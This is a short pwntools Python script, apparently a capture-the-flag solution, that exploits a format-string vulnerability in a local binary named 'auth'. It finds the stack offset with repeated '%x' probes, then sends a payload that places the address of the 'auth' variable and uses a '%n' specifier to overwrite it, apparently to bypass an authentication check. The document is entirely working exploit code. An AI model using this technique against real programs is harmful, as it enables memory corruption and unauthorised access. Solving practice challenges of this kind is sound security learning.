from pwn import *

def stack_offset(count):
    p=process(exe)
    payload=flat(
        b'AAAA',
        b' %x'*count,
    )
    p.recvuntil(b':')
    p.sendline(payload)
    responce=p.recvuntil(b'41414141').split(b' ') 
    info(responce)
    return len(responce)-2 #because, when i split it responce[0]=b''

exe='./auth'
context.log_level='debug'
elf=context.binary=ELF(exe)

var_address=elf.symbols['auth']

offset=stack_offset(10) #if not work for you, change the value
p=process(exe)

payload=flat(
    var_address,
    b'|'*6,
    f'%{offset}$n'.encode()
)

write('payload',payload)

p.sendline(payload)
info(p.recvall())